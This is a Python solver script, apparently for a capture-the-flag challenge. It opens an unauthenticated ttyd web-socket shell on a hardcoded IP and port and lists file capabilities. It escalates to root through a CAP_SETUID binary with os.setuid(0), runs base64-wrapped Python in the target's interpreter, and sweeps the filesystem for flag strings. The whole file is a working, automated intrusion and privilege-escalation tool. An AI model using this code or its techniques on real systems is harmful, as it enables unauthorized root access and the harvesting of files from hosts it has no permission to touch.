#!/usr/bin/env python
"""
find_flags.py - automatic flag hunter for the D-CTF / Host Busters ttyd web-shell box.

    python find_flags.py                 # hunt the default host
    python find_flags.py --quiet         # just the flags, no chatter

What it does, end to end:
  1. opens the ttyd web-socket shell at wss://<host>/ws  (no credentials needed)
  2. enumerates file capabilities with `getcap -r /`
  3. launches each capable binary that drops into an interpreter
  4. escalates with CAP_SETUID (`os.setuid(0)`) to root
  5. walks the filesystem and greps every file for flag-shaped strings
  6. prints a clean table, mapped to the owning user

Requires: websockets  (pip install websockets)
"""

import argparse
import asyncio
import base64
import json
import os
import re
import socket
import sys
import time

try:
    import websockets
    from websockets.asyncio.client import connect
except ImportError:
    sys.exit("missing dependency: pip install websockets")

# ---------------------------------------------------------------- config ----

# Accept a bare host ("hostbusters.dctf.io"), or a full origin with scheme and
# port ("http://142.93.197.9:7682"). The ws:// URL and the Origin header are
# derived from it, and the proxy is bypassed for direct IP:port targets.
DEFAULT_HOST = "http://142.93.197.9:7682"
COLS, ROWS = 160, 60
MAX_TRIES = 8

FLAG_RE = re.compile(
    r"(deadface\{[^}\s]{1,80}\}|flag\{[^}\s]{1,80}\}|FLAG\{[^}\s]{1,80}\}"
    r"|[A-Za-z0-9_]*CTF\{[^}\s]{1,80}\})"
)

# ------------------------------------------------------------------ client --

HOST = DEFAULT_HOST


def _ws_url(host: str) -> tuple:
    """host -> (ws_url, http_origin, use_proxy)"""
    h = host.strip()
    if "://" in h:
        scheme, rest = h.split("://", 1)
        rest = rest.rstrip("/")
        ws = "ws://" if scheme == "http" else "wss://"
        return f"{ws}{rest}/ws", f"{scheme}://{rest}", False
    # bare hostname -> assume the TLS front door
    return f"wss://{h}/ws", f"https://{h}", True


def out(msg=""):
    print(msg, flush=True)


def _decode_msg(raw) -> str:
    """Decode ONE ttyd websocket message.

    ttyd is message-oriented: each WS message is a single frame whose first
    byte is the command, and the REST is raw pty output - it is NOT newline
    delimited. Treating it as newline-delimited (my first attempt) leaks stray
    '0' bytes into the transcript and stalls on prompts, which never end in a
    newline.
    """
    if isinstance(raw, str):
        raw = raw.encode("utf-8", "surrogateescape")
    if not raw:
        return ""
    cmd, payload = raw[:1], raw[1:]
    if cmd == b"0":                       # OUTPUT
        return payload.decode("utf-8", "replace")
    if cmd in (b"1", b"2", b"4"):         # title / prefs / reconnect
        return ""
    return raw.decode("utf-8", "replace")  # unframed - pass through


class Shell:
    """One live ttyd session (a fresh copy of the box)."""

    def __init__(self):
        self.ws = None
        self.text = ""                    # decoded text accumulated for this read

    async def __aenter__(self):
        ws_url, origin, use_proxy = _ws_url(HOST)
        kwargs = {}
        if use_proxy:
            kwargs["proxy"] = True          # route via $HTTPS_PROXY
        # else: no "proxy" key at all -> websockets connects directly
        self.ws = await connect(
            ws_url,
            user_agent_header="Mozilla/5.0 (X11; Linux x86_64) Chrome/126",
            additional_headers={"Origin": origin},
            subprotocols=["tty"],          # required or the socket stays silent
            open_timeout=30,
            max_size=None,
            **kwargs,
        ).__aenter__()
        await self.ws.send(json.dumps(
            {"AuthToken": "", "columns": COLS, "rows": ROWS}).encode())   # BINARY init
        return self

    async def __aexit__(self, *exc):
        for coro in (lambda: self.ws.send(b"0exit\n"), self.ws.close):
            try:
                await coro()
            except Exception:
                pass

    async def _drain(self, seconds):
        loop = asyncio.get_event_loop()
        end = loop.time() + seconds
        while True:
            left = end - loop.time()
            if left <= 0:
                return
            try:
                raw = await asyncio.wait_for(self.ws.recv(), timeout=left)
            except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
                return
            self.text += _decode_msg(raw)

    async def send(self, line: str):
        await self.ws.send(b"0" + line.encode() + b"\n")

    async def read(self, seconds=3.0) -> str:
        await self._drain(seconds)
        txt, self.text = self.text, ""
        return txt

    async def sh(self, line: str, wait=4.0) -> str:
        await self.send(line)
        return await self.read(wait)

    async def py(self, code: str, wait=30.0) -> str:
        """Run python *inside* the target's interpreter, base64-wrapped."""
        b64 = base64.b64encode(code.encode()).decode()
        await self.send(f"import base64;exec(base64.b64decode('{b64}').decode())")
        return await self.read(wait)

    async def flush(self, seconds=2.5):
        await self._drain(seconds)
        self.text = ""

# Runs INSIDE the target's interpreter, after we have escalated.
SCAN_BODY = r'''
import os, re, pwd, subprocess as sp

PAT = re.compile(rb"(deadface\{[^}\s]{1,80}\}|flag\{[^}\s]{1,80}\}"
                 rb"|FLAG\{[^}\s]{1,80}\}|CTF\{[^}\s]{1,80}\})")
SKIP = ("/proc", "/sys", "/dev", "/run", "/usr/lib", "/usr/share",
        "/usr/src", "/var/lib/dpkg", "/var/cache", "/boot")
ROOTS = ["/", "/home", "/root", "/opt", "/srv", "/var/www", "/var/spool",
         "/tmp", "/etc", "/usr/local", "/mnt", "/media", "/flag", "/flags"]

found = []
for root in ROOTS:
    for dirpath, dirnames, filenames in os.walk(root):
        if dirpath.startswith(SKIP):
            dirnames[:] = []
            continue
        if dirpath.count("/") > 7:
            dirnames[:] = []
            continue
        for fn in filenames:
            p = os.path.join(dirpath, fn)
            try:
                if os.path.getsize(p) > 262144:
                    continue
                with open(p, "rb") as fh:
                    data = fh.read()
            except Exception:
                continue
            for m in PAT.findall(data):
                try:
                    owner = pwd.getpwuid(os.stat(p).st_uid).pw_name
                except Exception:
                    owner = "?"
                found.append((m.decode("utf-8", "replace"), p, owner))

# also name-based sweep as a backstop
r = sp.run(["sh", "-c",
            "find / -xdev -type f \\( -iname '*flag*' -o -iname 'user.txt' "
            "-o -iname 'root.txt' \\) 2>/dev/null"],
           capture_output=True, text=True)
for p in [x for x in r.stdout.splitlines() if x.strip()]:
    try:
        if os.path.getsize(p) > 262144:
            continue
        with open(p, "rb") as fh:
            data = fh.read()
    except Exception:
        continue
    for m in PAT.findall(data):
        try:
            owner = pwd.getpwuid(os.stat(p).st_uid).pw_name
        except Exception:
            owner = "?"
        found.append((m.decode("utf-8", "replace"), p, owner))

print("HUNT_START")
seen = set()
for flag, path, owner in found:
    k = (flag, path)
    if k in seen:
        continue
    seen.add(k)
    print("HUNT|%s|%s|%s" % (flag, path, owner))
print("HUNT_END")
print("CAPS: " + sp.run(["getcap", "-r", "/"], capture_output=True,
                        text=True).stdout.strip())
'''


def parse_hits(text):
    return re.findall(r"^HUNT\|(.+?)\|(.+?)\|(.+?)$", text, re.M)


# --------------------------------------------------------------- diagnostics --


def diagnose(exc) -> str:
    """Tell 'box is down' apart from 'sandbox cannot reach the host'."""
    name = type(exc).__name__
    if "InvalidStatus" in name or "ProxyStatus" in name:
        return ("origin/proxy returned an HTTP error - the challenge box is most "
                "likely offline (502 from the origin nginx) or the sandbox proxy "
                "is refusing the CONNECT. Retry later.")
    if "ConnectTimeout" in name or "TimeoutError" in name:
        return "timed out opening the connection - host unreachable from here."
    if "ProxyError" in name:
        return "local proxy handshake failed - the sandbox egress proxy may be down."
    return "unknown failure"


# ------------------------------------------------------------------- main ---

async def handshake_ok(sh, quiet=False):
    """A successful socket is NOT a working shell - confirm the backend replied."""
    banner = await sh.read(8.0)
    if not banner.strip():
        out("[X] connected, but the ttyd backend sent nothing.")
        out("    nginx is up; the box-spawning backend is not answering.")
        out("    Nothing to do but retry later - this is infrastructure, not a")
        out("    failure of the exploit path.")
        return False
    if not re.search(r"[\$#]\s*$", banner.splitlines()[-1] if banner.splitlines() else ""):
        # tolerate a banner without a trailing prompt, but say so once
        out("[!] connected, but no shell prompt in the banner:")
        out("    " + banner.strip()[-200:].replace("\n", "\n    "))
    return True


async def hunt(quiet=False):
    def say(msg):
        if not quiet:
            out(msg)

    say(f"[*] target   : {HOST}")
    say("[*] stage 1  : opening ttyd web-shell ...")

    for attempt in range(1, MAX_TRIES + 1):
        try:
            async with Shell() as sh:
                if not await handshake_ok(sh):
                    return 2                      # backend down, not our bug
                say(f"[+] shell obtained (attempt {attempt})")

                who = await sh.sh("id; hostname", 4.0)
                m = re.search(r"uid=\d+\(([^)]+)\)", who)
                me = m.group(1) if m else "?"
                say(f"[+] running as: {me}")

                # ---- stage 2: find the capability toys
                say("[*] stage 2  : enumerating file capabilities ...")
                caps = await sh.sh("getcap -r / 2>/dev/null", 15.0)
                cap_lines = [l.strip() for l in caps.splitlines()
                             if "=" in l and "/" in l]
                for c in cap_lines:
                    say(f"    ! {c}")
                if not cap_lines:
                    say("    (no file capabilities found)")

                # ---- stage 3: escalate through the capable binary
                # Two flavours of box have been seen:
                #   * pytool  -> a Python REPL holding CAP_SETUID  (os.setuid())
                #   * cryptctl-> a C tool that switches the shell's uid for you
                # So: run it, then just ask who we are now. Don't assume.
                say("[*] stage 3  : escalating via capable binary ...")
                tool = None
                for line in cap_lines:
                    if "cap_setuid" in line or "cap_setgid" in line:
                        tool = line.split()[0]
                        break
                if not tool:
                    say("[-] no setuid-capable binary; scanning unprivileged")
                else:
                    say(f"[+] using {tool}")
                    await sh.send(tool)
                    await sh.read(6.0)
                    who2 = await sh.sh("id", 5.0)
                    m2 = re.search(r"uid=(\d+)\(([^)]+)\)", who2)
                    if m2 and m2.group(2) != me:
                        say(f"[+] identity switched to {m2.group(2)} "
                            f"(uid {m2.group(1)}) via the capability")
                        # if it's an interpreter we can push to root as well
                        await sh.py("import os\nos.setuid(0)\nprint('TO', os.getuid())",
                                    6.0)
                        who3 = await sh.sh("id", 5.0)
                        m3 = re.search(r"uid=(\d+)\(([^)]+)\)", who3)
                        if m3 and m3.group(1) == "0":
                            say("[+] escalated to root")
                        else:
                            say("[~] staying as the switched identity")
                    else:
                        say("[~] identity unchanged; continuing as-is")

                # ---- stage 4: sweep for flags (shell-based: works in any shell)
                say("[*] stage 4  : sweeping the filesystem for flags ...")
                sweep = await sh.sh(
                    "grep -rIl 'deadface{' /home /root /opt /srv /var/www /tmp "
                    "/etc /usr/local 2>/dev/null | head -60", 45.0)
                paths = [p.strip() for p in sweep.splitlines()
                         if p.strip().startswith("/")]
                hits = []
                for p in paths:
                    body = await sh.sh(f"cat '{p}' 2>/dev/null", 6.0)
                    for f in re.findall(r"deadface\{[^}\s]+\}", body):
                        hits.append((f, p, ""))
                if not hits:
                    # fall back to the python sweep if a REPL is available
                    blob = await sh.py(SCAN_BODY, 90.0)
                    hits = parse_hits(blob)

                await sh.send("exit")
                await sh.flush(1.0)

                if not hits:
                    out("\n[!] no flag-shaped strings found")
                    return 1

                out("\n" + "=" * 78)
                out("FLAGS FOUND")
                out("=" * 78)
                by_flag = {}
                for flag, path, owner in hits:
                    by_flag.setdefault(flag, []).append((path, owner))
                for flag in sorted(by_flag):
                    for path, owner in by_flag[flag]:
                        out(f"  {flag}")
                        out(f"      {path}   (owner: {owner})")
                out("=" * 78)
                out(f"{len(by_flag)} unique flag(s) across {len(hits)} file(s)")
                return 0
        except Exception as e:
            say(f"[!] attempt {attempt} failed: {diagnose(e)}")
            if attempt < MAX_TRIES:
                time.sleep(8)
async def probe(reps=3, gap=15.0):
    """--probe: health check only. Is the box-spawning backend alive?"""
    out(f"[*] probing {HOST} - {reps} attempts, {gap:.0f}s apart")
    alive = 0
    for n in range(1, reps + 1):
        try:
            async with Shell() as sh:
                banner = await sh.read(8.0)
                if banner.strip():
                    alive += 1
                    first = banner.strip().splitlines()[-1][:60]
                    out(f"[{n}] ALIVE  - {first}")
                else:
                    out(f"[{n}] DEAD   - socket open, backend silent")
        except Exception as e:
            out(f"[{n}] DEAD   - {type(e).__name__}: {e}")
        if n < reps:
            await asyncio.sleep(gap)
    out(f"\nverdict: {alive}/{reps} probes reached a live shell")
    out("(nginx answering is not enough - it must actually spawn a shell)")
    return 0 if alive else 2


def main():
    global HOST
    ap = argparse.ArgumentParser(
        description="Find all flags on the D-CTF / Host Busters ttyd box",
        epilog="python find_flags.py --probe   # health check only")
    ap.add_argument("--host", default=DEFAULT_HOST)
    ap.add_argument("--quiet", "-q", action="store_true",
                    help="flags only, no progress chatter")
    ap.add_argument("--probe", "-p", action="store_true",
                    help="just check whether the box backend is alive")
    ap.add_argument("--reps", type=int, default=3)
    a = ap.parse_args()
    HOST = a.host
    if a.probe:
        sys.exit(asyncio.run(probe(a.reps)))
    sys.exit(asyncio.run(hunt(a.quiet)))


if __name__ == "__main__":
    main()
